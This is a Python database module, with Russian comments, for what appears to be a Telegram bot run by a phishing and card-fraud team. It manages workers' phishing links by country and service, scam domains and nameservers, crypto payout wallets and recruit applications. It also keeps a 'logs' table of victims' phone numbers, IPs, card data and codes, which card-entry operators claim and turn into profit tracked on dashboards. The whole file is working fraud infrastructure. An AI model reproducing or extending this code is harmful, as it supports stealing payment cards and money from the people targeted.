import aiosqlite
import os
import secrets
from datetime import datetime
from config import DB_PATH


async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                hashtag TEXT UNIQUE,
                referrer_id INTEGER,
                percent INTEGER DEFAULT 60,
                balance REAL DEFAULT 0,
                total_earned REAL DEFAULT 0,
                total_count INTEGER DEFAULT 0,
                last_profit REAL DEFAULT 0,
                language TEXT DEFAULT 'ru',
                banned INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                role TEXT DEFAULT 'worker'
            )
        """)
        # Миграция: добавляем колонку language, если её нет
        try:
            await db.execute("ALTER TABLE users ADD COLUMN language TEXT DEFAULT 'ru'")
            await db.commit()
        except Exception:
            pass
        # Миграция: добавляем колонку banned, если её нет
        try:
            await db.execute("ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0")
            await db.commit()
        except Exception:
            pass
        # Миграция: добавляем колонку online (на вбиве), если её нет
        try:
            await db.execute("ALTER TABLE users ADD COLUMN online INTEGER DEFAULT 0")
            await db.commit()
        except Exception:
            pass
        # Миграция: добавляем колонку online_since, если её нет
        try:
            await db.execute("ALTER TABLE users ADD COLUMN online_since TEXT")
            await db.commit()
        except Exception:
            pass
        await db.execute("""
            CREATE TABLE IF NOT EXISTS links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                country TEXT,
                service TEXT,
                url TEXT,
                clicks INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS payouts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                wallet_id INTEGER,
                amount REAL,
                status TEXT DEFAULT 'pending',
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Миграция: добавляем wallet_id, если её нет
        try:
            await db.execute("ALTER TABLE payouts ADD COLUMN wallet_id INTEGER")
            await db.commit()
        except Exception:
            pass
        await db.execute("""
            CREATE TABLE IF NOT EXISTS applications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE,
                username TEXT,
                previous_teams TEXT,
                reason_left TEXT,
                available_time TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS site_visits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                page TEXT,
                user_agent TEXT,
                referrer TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS site_applications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT,
                contact TEXT,
                telegram TEXT,
                experience TEXT,
                message TEXT,
                ip TEXT,
                status TEXT DEFAULT 'pending',
                taken_by INTEGER,
                taken_at TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Миграция: добавляем status/taken_by/taken_at/success_code, если их нет
        for col, dtype in (("status", "TEXT"), ("taken_by", "INTEGER"), ("taken_at", "TEXT"), ("success_code", "TEXT")):
            try:
                await db.execute(f"ALTER TABLE site_applications ADD COLUMN {col} {dtype}")
                await db.commit()
            except Exception:
                pass
        await db.execute("""
            CREATE TABLE IF NOT EXISTS domains (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                domain TEXT,
                status TEXT DEFAULT 'active',
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS global_domains (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT UNIQUE,
                status TEXT DEFAULT 'active',
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                network TEXT,
                address TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS bot_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        # Загружаем дефолтные настройки из .env, если их ещё нет в БД
        defaults = {
            "team_chat_invite_link": os.getenv("TEAM_CHAT_INVITE_LINK", ""),
            "payouts_channel_invite_link": os.getenv("PAYOUTS_CHANNEL_INVITE_LINK", ""),
            "team_chat_id": os.getenv("TEAM_CHAT_ID", ""),
            "payouts_channel_id": os.getenv("PAYOUTS_CHANNEL_ID", ""),
            "ns1": os.getenv("NS1", ""),
            "ns2": os.getenv("NS2", ""),
            "cf_ns1": os.getenv("CF_NS1", ""),
            "cf_ns2": os.getenv("CF_NS2", ""),
            "default_percent": os.getenv("DEFAULT_PERCENT", "60"),
        }
        for k, v in defaults.items():
            await db.execute(
                "INSERT OR IGNORE INTO bot_settings (key, value) VALUES (?, ?)",
                (k, v)
            )
        # ─────────── Логи вбивера (лог-меню) ───────────
        await db.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                unique_id TEXT UNIQUE,
                service TEXT,
                country TEXT,
                flag TEXT,
                phone TEXT,
                ip TEXT,
                device TEXT,
                amount REAL DEFAULT 0,
                currency TEXT DEFAULT 'UAH',
                link_id TEXT,
                username TEXT,
                user_id INTEGER,
                source TEXT DEFAULT 'Лендинг',
                status TEXT DEFAULT 'available',
                taken_by INTEGER,
                taken_at TEXT,
                profit REAL DEFAULT 0,
                code TEXT,
                card TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS active_logs (
                user_id INTEGER PRIMARY KEY,
                log_id INTEGER,
                updated_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS log_broadcasts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                log_id INTEGER,
                user_id INTEGER,
                message_id INTEGER,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS log_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                log_id INTEGER,
                user_id INTEGER,
                action TEXT,
                amount REAL DEFAULT 0,
                details TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.commit()


async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def create_user(user_id: int, username: str, referrer_id: int = None, percent: int = 60):
    hashtag = f"#Jx{user_id:08d}"
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username, hashtag, referrer_id, percent) VALUES (?, ?, ?, ?, ?)",
            (user_id, username or "", hashtag, referrer_id, percent)
        )
        await db.commit()


async def update_stats(user_id: int, amount: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET total_count = total_count + 1, total_earned = total_earned + ?, last_profit = ?, balance = balance + ? WHERE user_id = ?",
            (amount, amount, amount, user_id)
        )
        await db.commit()


async def update_language(user_id: int, language: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET language = ? WHERE user_id = ?",
            (language, user_id)
        )
        await db.commit()


async def set_banned(user_id: int, banned: bool = True):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET banned = ? WHERE user_id = ?",
            (1 if banned else 0, user_id)
        )
        await db.commit()


async def set_role(user_id: int, role: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET role = ? WHERE user_id = ?",
            (role, user_id)
        )
        await db.commit()


async def update_hashtag(user_id: int, hashtag: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET hashtag = ? WHERE user_id = ?",
            (hashtag, user_id)
        )
        await db.commit()


async def hashtag_exists(hashtag: str, exclude_user_id: int = None):
    async with aiosqlite.connect(DB_PATH) as db:
        sql = "SELECT 1 FROM users WHERE hashtag = ?"
        params = (hashtag,)
        if exclude_user_id is not None:
            sql += " AND user_id != ?"
            params = (hashtag, exclude_user_id)
        async with db.execute(sql, params) as cur:
            return await cur.fetchone() is not None


async def set_online(user_id: int, online: bool = True):
    """Статус «на вбиве». online=1 — вбивер сейчас работает (горит онлайн)."""
    async with aiosqlite.connect(DB_PATH) as db:
        if online:
            await db.execute(
                "UPDATE users SET online = 1, online_since = CURRENT_TIMESTAMP WHERE user_id = ?",
                (user_id,)
            )
        else:
            await db.execute(
                "UPDATE users SET online = 0, online_since = NULL WHERE user_id = ?",
                (user_id,)
            )
        await db.commit()


async def get_staff():
    """Список вбиверов, которые сейчас на вбиве."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM users WHERE role = 'vbiver' AND banned = 0 AND online = 1 ORDER BY online_since"
        ) as cur:
            rows = await cur.fetchall()
            return [dict(row) for row in rows]


async def add_link(user_id: int, country: str, service: str, url: str):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            "INSERT INTO links (user_id, country, service, url) VALUES (?, ?, ?, ?)",
            (user_id, country, service, url)
        )
        await db.commit()
        return cur.lastrowid


async def get_links(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM links WHERE user_id = ? ORDER BY id DESC", (user_id,)) as cur:
            return await cur.fetchall()


async def get_all_users():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users ORDER BY user_id") as cur:
            rows = await cur.fetchall()
            return [dict(row) for row in rows]


async def create_application(user_id: int, username: str, previous_teams: str, reason_left: str, available_time: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            """INSERT OR REPLACE INTO applications 
            (user_id, username, previous_teams, reason_left, available_time, status) 
            VALUES (?, ?, ?, ?, ?, 'pending')""",
            (user_id, username or "", previous_teams, reason_left, available_time)
        )
        await db.commit()


async def get_application(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM applications WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def get_pending_applications():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM applications WHERE status = 'pending' ORDER BY id") as cur:
            rows = await cur.fetchall()
            return [dict(row) for row in rows]


async def update_application_status(user_id: int, status: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE applications SET status = ? WHERE user_id = ?",
            (status, user_id)
        )
        await db.commit()


async def domain_exists(user_id: int, domain: str):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT 1 FROM domains WHERE user_id = ? AND domain = ?",
            (user_id, domain)
        ) as cur:
            return await cur.fetchone() is not None


async def add_domain(user_id: int, domain: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO domains (user_id, domain) VALUES (?, ?)",
            (user_id, domain)
        )
        await db.commit()


async def get_domains(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM domains WHERE user_id = ? ORDER BY id DESC", (user_id,)) as cur:
            return [dict(row) for row in await cur.fetchall()]


async def add_global_domain(domain: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO global_domains (domain) VALUES (?)",
            (domain,)
        )
        await db.commit()


async def get_global_domains():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM global_domains WHERE status = 'active' ORDER BY id DESC") as cur:
            return [dict(row) for row in await cur.fetchall()]


async def global_domain_exists(domain: str):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT 1 FROM global_domains WHERE domain = ?", (domain,)) as cur:
            return await cur.fetchone() is not None


async def add_wallet(user_id: int, network: str, address: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO wallets (user_id, network, address) VALUES (?, ?, ?)",
            (user_id, network, address)
        )
        await db.commit()


async def get_wallets(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM wallets WHERE user_id = ? ORDER BY id DESC", (user_id,)) as cur:
            return [dict(row) for row in await cur.fetchall()]


async def reset_worker_stats():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET total_count = 0, total_earned = 0, last_profit = 0, balance = 0 WHERE role = 'worker'"
        )
        await db.commit()


async def add_payout(user_id: int, amount: float, wallet_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            "INSERT INTO payouts (user_id, amount, wallet_id, status) VALUES (?, ?, ?, 'pending')",
            (user_id, amount, wallet_id)
        )
        await db.commit()
        return cur.lastrowid


async def get_payouts(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT p.*, w.network, w.address FROM payouts p LEFT JOIN wallets w ON p.wallet_id = w.id WHERE p.user_id = ? ORDER BY p.id DESC",
            (user_id,)
        ) as cur:
            return [dict(row) for row in await cur.fetchall()]


async def get_pending_payouts():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT p.*, w.network, w.address, u.username, u.hashtag FROM payouts p LEFT JOIN wallets w ON p.wallet_id = w.id JOIN users u ON p.user_id = u.user_id WHERE p.status = 'pending' ORDER BY p.id"
        ) as cur:
            return [dict(row) for row in await cur.fetchall()]


async def update_payout_status(payout_id: int, status: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE payouts SET status = ? WHERE id = ?", (status, payout_id))
        await db.commit()


async def deduct_balance(user_id: int, amount: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET balance = balance - ? WHERE user_id = ? AND balance >= ?",
            (amount, user_id, amount)
        )
        await db.commit()
        return db.total_changes > 0


async def refund_balance(user_id: int, amount: float):
    """Возврат средств на баланс (без затрагивания статистики)."""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET balance = balance + ? WHERE user_id = ?",
            (amount, user_id)
        )
        await db.commit()


async def update_username(user_id: int, username: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET username = ? WHERE user_id = ?",
            (username or "", user_id)
        )
        await db.commit()


async def delete_wallet(wallet_id: int, user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM wallets WHERE id = ? AND user_id = ?", (wallet_id, user_id))
        await db.commit()


async def get_wallet(wallet_id: int, user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM wallets WHERE id = ? AND user_id = ?", (wallet_id, user_id)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def delete_domain(domain_id: int, user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM domains WHERE id = ? AND user_id = ?", (domain_id, user_id))
        await db.commit()


async def wallet_exists(user_id: int, network: str, address: str):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT 1 FROM wallets WHERE user_id = ? AND network = ? AND address = ?",
            (user_id, network, address)
        ) as cur:
            return await cur.fetchone() is not None


async def get_setting(key: str, default: str = ""):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT value FROM bot_settings WHERE key = ?", (key,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else default


async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)",
            (key, value)
        )
        await db.commit()


async def add_site_visit(ip: str, page: str, user_agent: str, referrer: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO site_visits (ip, page, user_agent, referrer) VALUES (?, ?, ?, ?)",
            (ip, page, user_agent, referrer)
        )
        await db.commit()


async def add_site_application(name: str, contact: str, telegram: str, experience: str, message: str, ip: str):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            "INSERT INTO site_applications (name, contact, telegram, experience, message, ip, status) VALUES (?, ?, ?, ?, ?, ?, 'pending')",
            (name, contact, telegram, experience, message, ip)
        )
        await db.commit()
        return cur.lastrowid


async def get_site_visits_count():
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT COUNT(*) FROM site_visits") as cur:
            row = await cur.fetchone()
            return row[0] if row else 0


async def get_site_application(app_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM site_applications WHERE id = ?", (app_id,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def take_site_application(app_id: int, user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE site_applications SET status = 'taken', taken_by = ?, taken_at = CURRENT_TIMESTAMP WHERE id = ? AND status = 'pending'",
            (user_id, app_id)
        )
        await db.commit()
        return db.total_changes > 0


async def mark_site_success(app_id: int, user_id: int):
    import secrets
    code = secrets.token_urlsafe(8)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE site_applications SET status = 'success', success_code = ? WHERE id = ? AND status = 'taken' AND taken_by = ?",
            (code, app_id, user_id)
        )
        await db.commit()
        if db.total_changes > 0:
            return code
        return None


async def get_site_application_by_code(code: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM site_applications WHERE success_code = ?", (code,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def get_vbivers():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users WHERE role = 'vbiver' AND banned = 0") as cur:
            return [dict(row) for row in await cur.fetchall()]


async def get_user_by_id(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


# ─────────── ЛОГИ ВБИВЕРА (лог-меню) ───────────

async def add_log(
    service: str, country: str, flag: str, phone: str, ip: str, device: str,
    amount: float, currency: str, link_id: str, username: str, lead_user_id: int,
    source: str = "Лендинг",
):
    """Создаёт новый лог. Возвращает (id, unique_id)."""
    unique_id = secrets.token_hex(16)
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            """INSERT INTO logs
            (unique_id, service, country, flag, phone, ip, device, amount, currency,
             link_id, username, user_id, source, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'available')""",
            (unique_id, service, country, flag, phone, ip, device, amount, currency,
             link_id, username, lead_user_id, source),
        )
        await db.commit()
        return cur.lastrowid, unique_id


async def get_log(log_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM logs WHERE id = ?", (log_id,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def get_available_logs():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM logs WHERE status = 'available' ORDER BY id"
        ) as cur:
            return [dict(row) for row in await cur.fetchall()]


async def take_log(log_id: int, user_id: int):
    """Атомарно забирает свободный лог. True — если получилось."""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE logs SET status='taken', taken_by=?, taken_at=CURRENT_TIMESTAMP "
            "WHERE id=? AND status='available'",
            (user_id, log_id),
        )
        await db.commit()
        return db.total_changes > 0


async def release_log(log_id: int, user_id: int):
    """Возвращает лог в общий пул. True — если получилось."""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE logs SET status='available', taken_by=NULL, taken_at=NULL "
            "WHERE id=? AND taken_by=?",
            (log_id, user_id),
        )
        await db.commit()
        return db.total_changes > 0


async def set_log_status(log_id: int, status: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE logs SET status = ? WHERE id = ?", (status, log_id))
        await db.commit()


async def set_log_profit(log_id: int, profit: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE logs SET profit = ? WHERE id = ?", (profit, log_id))
        await db.commit()


async def set_log_code(log_id: int, code: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE logs SET code = ? WHERE id = ?", (code, log_id))
        await db.commit()


async def set_log_card(log_id: int, card: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE logs SET card = ? WHERE id = ?", (card, log_id))
        await db.commit()


async def set_active_log(user_id: int, log_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO active_logs (user_id, log_id, updated_at) "
            "VALUES (?, ?, CURRENT_TIMESTAMP)",
            (user_id, log_id),
        )
        await db.commit()


async def get_active_log(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT l.* FROM logs l JOIN active_logs a ON a.log_id = l.id WHERE a.user_id = ?",
            (user_id,),
        ) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def clear_active_log(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM active_logs WHERE user_id = ?", (user_id,))
        await db.commit()


# ─────────── РАССЫЛКА ЛОГОВ (кто взял / снова свободен) ───────────

async def add_log_broadcast(log_id: int, user_id: int, message_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO log_broadcasts (log_id, user_id, message_id) VALUES (?, ?, ?)",
            (log_id, user_id, message_id),
        )
        await db.commit()


async def get_log_broadcasts(log_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM log_broadcasts WHERE log_id = ?", (log_id,)
        ) as cur:
            return [dict(row) for row in await cur.fetchall()]


async def clear_log_broadcasts(log_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM log_broadcasts WHERE log_id = ?", (log_id,))
        await db.commit()


# ─────────── ЖУРНАЛ СОБЫТИЙ (audit) ───────────

async def add_log_event(log_id: int, user_id: int, action: str, amount: float = 0, details: str = ""):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO log_events (log_id, user_id, action, amount, details) VALUES (?, ?, ?, ?, ?)",
            (log_id, user_id, action, amount, details),
        )
        await db.commit()


async def get_log_events(log_id: int, limit: int = 10):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT e.*, u.username FROM log_events e "
            "LEFT JOIN users u ON u.user_id = e.user_id "
            "WHERE e.log_id = ? ORDER BY e.id DESC LIMIT ?",
            (log_id, limit),
        ) as cur:
            return [dict(row) for row in await cur.fetchall()]


async def get_recent_events(limit: int = 40):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT e.*, u.username FROM log_events e "
            "LEFT JOIN users u ON u.user_id = e.user_id "
            "ORDER BY e.id DESC LIMIT ?",
            (limit,),
        ) as cur:
            return [dict(row) for row in await cur.fetchall()]


# ─────────── СТАТИСТИКА ВБИВЕРА ───────────

async def get_worker_stats(user_id: int, since: str = None):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        sql = ("SELECT action, COUNT(*) AS c, COALESCE(SUM(amount), 0) AS s "
               "FROM log_events WHERE user_id = ?")
        params = [user_id]
        if since:
            sql += " AND created_at >= ?"
            params.append(since)
        sql += " GROUP BY action"
        async with db.execute(sql, params) as cur:
            rows = await cur.fetchall()

    agg = {r["action"]: (r["c"], r["s"]) for r in rows}
    taken = agg.get("taken", (0, 0))[0]
    success = agg.get("success", (0, 0))[0] + agg.get("profit", (0, 0))[0]
    problem = agg.get("problem", (0, 0))[0]
    banned = agg.get("banned", (0, 0))[0]
    profit = agg.get("profit", (0, 0))[1]
    released = agg.get("released", (0, 0))[0]
    avg_check = (profit / success) if success else 0
    conversion = (success / taken * 100) if taken else 0
    return {
        "taken": taken, "success": success, "problem": problem, "banned": banned,
        "released": released, "profit": profit, "avg_check": avg_check,
        "conversion": conversion,
    }


# ─────────── ДАШБОРД АДМИНА ───────────

async def get_log_dashboard():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row

        async with db.execute("SELECT status, COUNT(*) AS c FROM logs GROUP BY status") as cur:
            status_rows = await cur.fetchall()
        by_status = {r["status"]: r["c"] for r in status_rows}

        async with db.execute(
            "SELECT l.service AS service, COUNT(*) AS c FROM logs l GROUP BY l.service ORDER BY c DESC LIMIT 8"
        ) as cur:
            by_service = [dict(r) for r in await cur.fetchall()]

        async with db.execute(
            "SELECT l.country AS country, COUNT(*) AS c FROM logs l GROUP BY l.country ORDER BY c DESC LIMIT 8"
        ) as cur:
            by_country = [dict(r) for r in await cur.fetchall()]

        async with db.execute(
            "SELECT taken_by, COUNT(*) AS total, "
            "SUM(CASE WHEN status='success' THEN 1 ELSE 0 END) AS success, "
            "COALESCE(SUM(profit), 0) AS profit "
            "FROM logs WHERE taken_by IS NOT NULL "
            "GROUP BY taken_by ORDER BY profit DESC, total DESC LIMIT 10"
        ) as cur:
            top_rows = [dict(r) for r in await cur.fetchall()]

    return {
        "by_status": by_status,
        "by_service": by_service,
        "by_country": by_country,
        "top_vbivers": top_rows,
    }
